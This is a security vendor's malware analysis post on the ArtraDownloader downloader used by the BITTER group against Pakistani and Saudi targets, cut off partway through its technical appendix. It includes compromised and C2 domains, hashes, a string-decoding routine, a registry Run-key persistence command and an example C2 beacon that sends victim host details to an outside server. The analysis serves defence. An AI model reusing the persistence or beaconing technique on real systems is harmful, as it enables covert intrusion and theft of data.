<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-96323 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Multiple ArtraDownloader Variants Used by BITTER to Target Pakistan</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-96323 entry-meta">
			
			
			<span class="post-views-count">29,867</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'96323','like')"><i class="ui ui-2"></i><span class="ml-5">2</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 10</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmultiple-artradownloader-variants-used-by-bitter-to-target-pakistan%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmultiple-artradownloader-variants-used-by-bitter-to-target-pakistan%2F+-+Multiple+ArtraDownloader+Variants+Used+by+BITTER+to+Target+Pakistan" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmultiple-artradownloader-variants-used-by-bitter-to-target-pakistan%2F&title=Multiple+ArtraDownloader+Variants+Used+by+BITTER+to+Target+Pakistan&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/joshgruznweig/" title="Posts by Josh Grunzweig" class="author url fn" rel="author">Josh Grunzweig</a> and <a href="https://unit42.paloaltonetworks.com/author/brittany-ash/" title="Posts by Brittany Barbehenn" class="author url fn" rel="author">Brittany Barbehenn</a>        </p>
        <p><time datetime="2019-02-25T14:00:06+00:00">February 25, 2019 at 6:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit-42/" rel="category tag">Unit 42</a>, <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/artradownloader/" rel="tag">artradownloader</a>, <a href="https://unit42.paloaltonetworks.com/tag/bitter/" rel="tag">Bitter</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><h2>Executive Summary</h2>
<p>Since at least 2015, <a href="https://ti.360.net/blog/articles/analysis-of-targeted-attack-against-pakistan-by-exploiting-inpage-vulnerability-and-related-apt-groups-english/">a suspected South Asian threat grouping</a> known as BITTER has been targeting Pakistan and Chinese organizations using variants of a previously unreported downloader. We have named this malware family ArtraDownloader based on a PDB string discovered within the samples. We’ve observed three variants of this downloader with the earliest timestamp of February 2015.  This downloader has frequently been observed downloading the Remote Access Trojan (RAT) BitterRAT which is associated with <a href="https://www.forcepoint.com/blog/security-labs/bitter-targeted-attack-against-pakistan" target="_blank" rel="noopener">BITTER</a> threat operations.</p>
<p>Starting in September 2018 and continuing through the beginning of 2019, BITTER launched a wave of attacks targeting Pakistan and Saudi Arabia. This is the first reported instance of BITTER targeting Saudi Arabia. Details surrounding these attacks and the three ArtraDownloader variants observed are described below.</p>
<h2>Activities</h2>
<p>Between mid-September 2018 and January 2019, Unit 42 observed the ArtraDownloader used in the targeting of Pakistan and Saudi Arabian organizations. Several malicious documents have been identified, all communicating with likely compromised, legitimate Pakistan websites to retrieve the payload. These websites include those associated with the Pakistan government and other Pakistan organizations.</p>
<p>Beginning on Sep 12, 2018, we observed files with the following names hosted on the URL https://wforc[.]pk/js/.</p>
<ul>
<li>Internet Data Traffic Report – August 2018.docx</li>
<li>PAF Webmail Security Report.doc.exe</li>
</ul>
<p>The presumed spear phish targeted an employee of  an organization  in Saudi Arabia. The malicious file communicated with the C2 nethosttalk[.]com.</p>
<p>Around the same timeframe, two additional files (listed below) were observed being hosted on another Pakistan website. These executables, which had the following names, were hosted on the URL khurram.com[.]pk/js/drvn and communicated with the domain nethosttalk[.]com for C2.</p>
<ul>
<li>Handling of Logistics.pdf[.]com</li>
<li>Cyber security work shop.pdf[.]com</li>
</ul>
<p>Beginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net.  The RMMUN, Roots Metropolitan Model United Nations, is an organized event that was held on November 8-11, 2018 which fosters collaboration and insights into issues such as human rights and economic development.</p>
<p>Between November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting two AtraDownloader executables as well as a malicious document used to deliver a payload.  One of the files, Port Details.doc is an RTF document crafted to exploit the EQNEDT vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-11882" target="_blank" rel="noopener">CVE-2017-11882</a>. This file downloaded a payload that also communicated with the domain hewle.kielsoservice[.]net. The other two files hosted on the engineering company’s domain communicated with command and control domain xiovo426[.]net.</p>
<p>On 2 Jan 19, the file article_amy.doc was also uploaded into VirusTotal. This document was hosted on almasoodgroup[.]com/js/cwqj and communicated with C2 domain thepandaservices.nsiagenthoster[.]net. The domain almasoodgroup[.]com appears to be a legitimate but compromised domain in this particular instance.</p>
<p>On December 17 and 18 2018, a file was downloaded from http://fst.gov[.]pk/images/winsvc (SHA256: ef0cb0a1…) after a user accessed the document cocktail and the dinner in the last week of dec.doc. We do not know how the user was initially enticed to execute this document. This payload is an instance of ArtraDownloader variant 1 exploits CVE-2017-11882 (EQNEDT). In this case it was observed using the command and control domain of hewle.kielsoservice[.]net/Engset.php.</p>
<h3>Variant Comparison</h3>
<p>In total, roughly 80 unique instances of the ArtraDownloader malware family have been discovered. Within these samples, 3 distinct variants are identified. These variants generally have minor changes between them, specifically as it pertains to string obfuscation, as well as HTTP requests.</p>
<p>The earliest sample identified belonging to ArtraDownloader has a compile timestamp of February 2015, which provides a rough outline as to how old this malware family is.</p>
<p>To date, Unit 42 has only observed this malware family downloading and executing instances of the RAT malware family associated with BITTER. A breakdown as to when each identified sample was compiled is as follows:</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/02/Figure-1-Timeline-of-ArtraDownloader-variants-based-on-compile-timestamps.png" rel="wpdevart_lightbox"><img class="aligncenter size-full wp-image-96331" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/02/Figure-1-Timeline-of-ArtraDownloader-variants-based-on-compile-timestamps.png" alt="" width="1430" height="358" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/02/Figure-1-Timeline-of-ArtraDownloader-variants-based-on-compile-timestamps.png 1430w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/02/Figure-1-Timeline-of-ArtraDownloader-variants-based-on-compile-timestamps-900x225.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/02/Figure-1-Timeline-of-ArtraDownloader-variants-based-on-compile-timestamps-300x75.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/02/Figure-1-Timeline-of-ArtraDownloader-variants-based-on-compile-timestamps-768x192.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/02/Figure-1-Timeline-of-ArtraDownloader-variants-based-on-compile-timestamps-1024x256.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/02/Figure-1-Timeline-of-ArtraDownloader-variants-based-on-compile-timestamps-370x93.png 370w" sizes="(max-width: 1430px) 100vw, 1430px" /></a></p>
<p style="text-align: center;">Figure 1 Timeline of ArtraDownloader variants based on compile timestamps</p>
<p>Overall, the ArtraDownloader malware family is not sophisticated, leveraging simple registry keys for persistence and HTTP requests to download and execute a remote file. Important strings within these samples are obfuscated by adding or subtracting from each byte within a string. This same obfuscation routine is used when sending data via HTTP.</p>
<p>Of interest, during this analysis we discovered infrastructure use overlap seen in a previously analyzed payload. In <a href="https://unit42.paloaltonetworks.com/unit42-recent-inpage-exploits-lead-multiple-malware-families/">November 2017</a> we reported on malicious documents that were downloaded from the domain zmwardrobe[.]com and subsequently executed a payload referred to as MY24. This activity was observed through September and October 2017. In November 2017, we first observed ArtraDownloader querying the same domain; this continuing through February 2018. Both payloads were observed in InPage exploits.</p>
<p>For more information about the variants discovered and an in-depth analysis on each, please refer to the Appendix.</p>
<h2>Conclusion</h2>
<p>To date, the threat actor commonly referred to as BITTER continues to be active against various regions across the globe. They are observed targeting Pakistan, China, and Saudi Arabia using a customized downloader malware family named ArtraDownloader. This downloader, leveraging unique custom obfuscation routines downloads and executes the BitterRAT malware family via HTTP.</p>
<p>Multiple organizations have been affected or found to be hosting the malware used by BITTER, including the Pakistan government, an engineering company, and an electrical provider. We will continue to monitor this threat actor in the future. Palo Alto Networks customers are protected against this threat in the following ways:</p>
<ul>
<li>All malware is appropriately classified as malicious in WildFire</li>
<li>Domains being used for communication by malware and URLs hosting malware are flagged as malicious</li>
<li>AutoFocus customers may use the BITTER, BITTERRAT, and ArtraDownloader tags for continued tracking of this threat.</li>
</ul>
<p><span style="font-size: 12pt;">Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit cyberthreatalliance.org.</span></p>
<h2>Appendix</h2>
<h3>ArtraDownloader Malware Analysis – Variant 1</h3>
<p>For the remainder of the analysis, the following file is used:</p>
<table width="675">
<tbody>
<tr>
<td width="102"><strong>MD5</strong></td>
<td width="573">7cc0b212d1b8ceb808c250495d83bae4</td>
</tr>
<tr>
<td width="102"><strong>SHA1</strong></td>
<td width="573">d2c161ce52240b61d632607a2262890327d82502</td>
</tr>
<tr>
<td width="102"><strong>SHA256</strong></td>
<td width="573">ef0cb0a1a29bcdf2b36622f72734aec8d38326fc8f7270f78bd956e706a5fd57</td>
</tr>
<tr>
<td width="102"><strong>Compile Timestamp</strong></td>
<td width="573">2018-12-06 11:14:45 UTC</td>
</tr>
</tbody>
</table>
<p>Table 1 ArtraDownloader Variant 1 Sample</p>
<p>Upon execution, the sample will create and register a new window class with the following properties:</p>
<p><span style="font-family: 'courier new', courier, monospace;">Window Name: seal</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Class Name: SEAL</span></p>
<p>Upon receiving a WM_CREATE message in this newly created window class, it will execute a new function after 20 seconds via a call to SetTimer(). This function is responsible for actually downloading and executing a remote payload and will only be called at the end of the malware’s execution.</p>
<p>ArtraDownloader continues to collect the following information from the victim machine:</p>
<ul>
<li>Computer name</li>
<li>Operating system</li>
<li>Username</li>
</ul>
<p>Throughout the malware’s execution, various strings are encoded to avoid detection. The following Python code may be used to decode these strings:</p>
<p><span style="font-family: 'courier new', courier, monospace;">def decode(data):</span></p>
<p style="padding-left: 30px;"><span style="font-family: 'courier new', courier, monospace;">out = &#8220;&#8221;</span></p>
<p style="padding-left: 30px;"><span style="font-family: 'courier new', courier, monospace;">for d in data:</span></p>
<p style="padding-left: 60px;"><span style="font-family: 'courier new', courier, monospace;">out += chr(ord(d)-1)</span></p>
<p style="padding-left: 30px;"><span style="font-family: 'courier new', courier, monospace;">return out</span></p>
<p>Example:</p>
<p style="padding-left: 30px;"><span style="font-family: 'courier new', courier, monospace;">&gt;&gt; print(decode(&#8220;ifxmf/ljfmtptfswjdf/ofu&#8221;))</span></p>
<p style="padding-left: 30px;"><span style="font-family: 'courier new', courier, monospace;">&gt;&gt; hewle.kielsoservice[.]net</span></p>
<p>It then attempts to acquire the following folder paths. The first successfully identified folder will be used.</p>
<ul>
<li>TEMPLATES</li>
<li>NETHOOD</li>
<li>APPDATA</li>
</ul>
<p>The ctfmon.exe file is appended to this path, which will be the destination ArtraDownloader copies itself too in the event this file does not already exist.</p>
<p>The malware then attempts to acquire the following folder paths. The first successfully identified folder will be used.</p>
<ul>
<li>NETHOOD</li>
<li>TEMPLATES</li>
<li>APPDATA</li>
</ul>
<p>The perfc file is appended to this path, which will be the temporary destination the malware uses when downloading a remote file.</p>
<p>The downloader proceeds to identify the victim’s machine GUID via the HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid registry key. If this key is successfully queried, a string with the following data is formatted:</p>
<p><span style="font-family: 'courier new', courier, monospace;">[Computer Name]##[Username]@@[Machine GUID]</span></p>
<p>Otherwise, the following string is generated:</p>
<p><span style="font-family: 'courier new', courier, monospace;">[Computer Name]!@[Username]</span></p>
<p>This information will be used in subsequent network requests. In order to ensure persistence, the malware modifies the host’s registry to accomplish this. The following two keys are set:</p>
<p><span style="font-family: 'courier new', courier, monospace;">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\JITDfbug &#8211; &#8220;cmd /c start %Qrp% &amp;&amp; exit&#8221;</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">HKCU\Environment\Qrp &#8211; [path]\ctfmon.exe</span></p>
<p>Where [path] is the previously chosen path where ArtraDownloader has copied itself. These two registry key modifications ensure that the malware executes every time the victim machine starts.</p>
<p>At this point in the malware’s execution flow, the previously discussed function that is executed on a 20 second timer will ultimately run. It will begin by making the following example POST request to the remote C2 server:</p>
<p><span style="font-family: 'courier new', courier, monospace;">POST /Engset.php HTTP/1.0</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Host: hewle.kielsoservice[.]net</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Connection: keep-alive</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Content-type: application/x-www-form-urlencoded</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Content-length: 148</span></p>
<p>&nbsp;</p>
<p><span style="font-family: 'courier new', courier, monospace;">BCDEF=XJO.82GO2QF2BU9&amp;MNOPQ=Xjoepxt!8!Vmujnbuf&amp;GHIJ=Kpti!Hsvo{xfjh&amp;UVWXYZ=XJO.82GO2QF2BU9$$Kpti!Hsvo{xfjhAA214cf8g5.cgc9.51gb.914d.f17ceg:e4cc7&amp;st=0</span></p>
<p>In this request, the POST data is encoded using the same technique witnessed on the strings. Upon decoding them, we are presented with the following:</p>
<table>
<tbody>
<tr>
<td width="208"><strong>POST Variable</strong></td>
<td width="208"><strong>Description</strong></td>
<td width="208"><strong>Decoded Example</strong></td>
</tr>
<tr>
<td width="208">BCDEF</td>
<td width="208">Hostname</td>
<td width="208">WIN-71FN1PE1AT8</td>
</tr>
<tr>
<td width="208">MNOPQ</td>
<td width="208">Microsoft Windows Version</td>
<td width="208">Windows 7 Ultimate</td>
</tr>
<tr>
<td width="208">GHIJ</td>
<td width="208">Username</td>
<td width="208">Josh Grunzweig</td>
</tr>
<tr>
<td width="208">UVWXYZ</td>
<td width="208">Previously created string used as a unique identifier for the victim</td>
<td width="208">WIN-71FN1PE1AT8##Josh Grunzweig@@103be7f4-bfb8-40fa-803c-e06bdf9d3bb6</td>
</tr>
<tr>
<td width="208">st</td>
<td width="208">Boolean value indicating if previously downloaded file executed successfully.</td>
<td width="208">0</td>
</tr>
</tbody>
</table>
<p>Table 2 Decoded POST requests in ArtraDownloader Variant 1</p>
<p>The expected response is as follows, where ‘qbzmpbe’ is the example encoded executable name (decoded: ‘payload’) that will be downloaded and executed:</p>
